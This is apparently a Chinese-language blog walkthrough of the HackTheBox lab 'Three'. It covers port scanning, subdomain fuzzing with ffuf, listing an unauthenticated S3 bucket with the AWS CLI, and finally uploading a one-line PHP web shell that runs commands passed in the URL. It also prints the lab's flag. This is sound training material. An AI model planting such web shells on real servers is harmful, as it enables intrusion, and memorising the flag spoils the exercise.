---
title: HackTheBox记录
published: 2026-06-16T13:00:00
description: hackthebox靶场记录，持续更新。
tags:
  - HackTheBox
category: 网络安全
draft: false
---

# 靶场通关记录

# 靶场three

Target IP Address目标IP地址：10.129.227.248

## Task 1

How many TCP ports are open?  

端口扫描：
**-sC**  使用默认脚本扫描
**-sV**  探测服务/版本信息
```
nmap -sC -sV 10.129.227.248
```

使用无ping扫描：
```
nmap -Pn 10.129.227.248
```

注意到回显结果
```
└─$ nmap -Pn 10.129.227.248
Starting Nmap 7.98 ( https://nmap.org ) at 2026-06-15 23:04 -0400
Nmap scan report for bogon (10.129.227.248)
Host is up (0.40s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

answer：2

## Task 2

What is the domain of the email address provided in the "Contact" section of the website?

直接访问ip进行查找

answer：thetoppers.htb

## Task 3

In the absence of a DNS server, which Linux file can we use to resolve hostnames to IP addresses in order to be able to access the websites that point to those hostnames?
在没有DNS服务器的情况下，我们可以使用哪个Linux文件来解析主机名到IP地址，以便访问指向这些主机名的网站？

修改hosts文件，将域名与IP对应
```
┌──(kali㉿kali)-[~/Desktop]
└─$ cat /etc/hosts
127.0.0.1       localhost
127.0.1.1       kali
::1             localhost ip6-localhost ip6-loopback
ff02::1         ip6-allnodes
ff02::2         ip6-allrouters


10.129.227.248 thetoppers.htb

```

**本地静态解析**主机名（或域名）到 IP 地址，优先级**高于 DNS**（系统会先查 hosts 文件，如果找到映射就直接使用，不再查询 DNS）。

answer：/etc/hosts

## Task 4

Which sub-domain is discovered during further enumeration?

使用fuff扫描子域名

**前置**：
安装seclists，这样会有几个特定用途的字典
```
sudo apt update
sudo apt install seclists -y
ls -l /usr/share/seclists
```
**参数**：
1. `-c`：表示对HTTP响应代码进行自动匹配和过滤，只显示有效的响应。
2. `-w ./dict.txt`：指定字典文件，用于枚举URL路径
3. `-u 'http://192.168.198.12?FUZZ=/etc'`：指定目标URL，其中 ==`FUZZ`是ffuf的关键词，代表需要替换的位置，这里用它替换了URL路径的一部分，即 `/etc`。ffuf会把字典中的每个元素替换到 `FUZZ` 位置并访问相应的URL。==
4. `-H 'Host: FUZZ.example.com'`：修改 Host 头，发现同一 IP 下的不同子域名。==其他用法还可以修改**指定认证信息**、**伪造客户端标识**、**自定义 Cookie**、**指定内容类型**==
5. `-fs 0,8`：过滤响应大小，这里表示只显示响应大小在0到8字节之间的结果。这个参数可以帮助过滤掉不必要的响应。==一般是初次扫过后，大致判断无用的响应后的大小再过滤==。
6. `-ac` ：该参数的工作流程分为三步：
   **发送探测包**：在正式扫描前，`ffuf` 会先向目标发送一个**几乎不可能存在的随机字符串**（例如 `fsd8f7s9f`）作为请求。
   **建立响应基线**：分析刚才那个"不存在"请求返回的**特征**。这包括响应的状态码（如 200）、内容大小（Content-Length）、字数、行数等。
   **自动创建过滤器**：根据这个基线，`ffuf` 会自动生成一套过滤规则。在后续扫描中，**任何与基线响应特征相同的结果都会被自动隐藏**。
```
┌──(kali㉿kali)-[~/Desktop]
└─$ ffuf -u http://thetoppers.htb -H "Host: FUZZ.thetoppers.htb" \      
     -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
     -mc all -o scan.json -of json

┌──(kali㉿kali)-[~/Desktop]
└─$ cat scan.json | jq -r '.results[] | select(.length == 306) | .input.FUZZ' 

gc._msdcs

┌──(kali㉿kali)-[~/Desktop]
└─$ cat scan.json | jq -r '.results[] | select(.length == 21) | .input.FUZZ'
 
s3

```

或者使用gobuster
```
gobuster vhost -u http://thetoppers.htb -w /usr/share/seclists/Discovery/DNS /subdomains-top1million-20000.txt --append-domain

```

之后将s3添加到/etc/hosts

**参数**：
1. `tee`：同时输出到文件和屏幕，既能写入文件，又能显示在终端。
2. `-a`：在文件**末尾添加**，而不是覆盖整个文件。
```
┌──(kali㉿kali)-[~/Desktop]
└─$ echo "10.129.227.248 s3.thetoppers.htb" | sudo tee -a /etc/hosts        
10.129.227.248 s3.thetoppers.htb

```

answer：s3.thetoppers.htb

## Task 5

Which service is running on the discovered sub-domain?

子领域（s3.）的前缀是一个非常重要的线索。试着在谷歌搜索“s3 service”，了解哪家主要公司提供这项技术。提交标记时，您需要同时提供公司名称和服务名称

answer：Amazon S3

## Task 6

Which command line utility can be used to interact with the service running on the discovered sub-domain?

在Linux中使用Amazon S3经常使用 AWS CLI 进行对象管理，所以在这里需要下载AWS CLI

answer：awscli

## Task 7

Which command is used to set up the AWS CLI installation?

以下为官方文档解释：
运行此命令可快速设置和查看凭证、区域和输出格式。以下示例显示了示例值。
```
$ aws configure
AWS Access Key ID [None]: 
AWS Secret Access Key [None]: 
Default region name [None]:
Default output format [None]: 

```

answer：aws configure

## Task 8

What is the command used by the above utility to list all of the S3 buckets?

查阅官方文档，需要先进行配置，也就是上一步的操作，随便填写，之后在官方文档中找出S3的命令示例

**参数**：
`--endpoint-url<string> `
指定要将请求发送到的 URL。对于大多数命令，AWS CLI 会根据所选服务和指定的 AWS 区域自动确定 URL。但是，某些命令需要您指定账户专用 URL。您还可以配置一些 AWS 服务直接在您的私有 VPC 中托管端点（然后可能需要指定该端点）。

所以在命令中需要指定到本地的s3服务

```
┌──(kali㉿kali)-[~/Desktop]
└─$ aws --endpoint=http://s3.thetoppers.htb s3 ls
2026-06-15 22:57:48 thetoppers.htb
                                                                             
┌──(kali㉿kali)-[~/Desktop]
└─$ aws --endpoint=http://s3.thetoppers.htb s3 ls s3://thetoppers.htb
                           PRE images/
2026-06-15 22:57:48          0 .htaccess
2026-06-15 22:57:48      11952 index.php

```

answer：aws s3 ls

## Task 9

This server is configured to run files written in what web scripting language?

答案在上题中已经很明显了

answer：PHP

## Task 10

Submit the flag located in /var/www/.

官方文档指出以下 `cp` 命令会将单个文件复制到指定的存储桶和密钥

```
┌──(kali㉿kali)-[~/Desktop]
└─$ echo '<?php system($_GET["cmd"]); ?>' > webshell.php  

┌──(kali㉿kali)-[~/Desktop]
└─$ aws --endpoint=http://s3.thetoppers.htb s3 cp webshell.php s3://thetoppers.htb
upload: ./webshell.php to s3://thetoppers.htb/webshell.php    

┌──(kali㉿kali)-[~/Desktop]
└─$ aws --endpoint=http://s3.thetoppers.htb s3 ls s3://thetoppers.htb
                           PRE images/
2026-06-15 22:57:48          0 .htaccess
2026-06-15 22:57:48      11952 index.php
2026-06-16 01:05:58         31 webshell.php

```

url：`http://thetoppers.htb/webshell.php?cmd=ls ../`，发现存在flag.txt

url：`http://thetoppers.htb/webshell.php?cmd=cat ../flag.txt`，拿到flag

answer：a980d99281a28d638ac68b9bf9453c2b
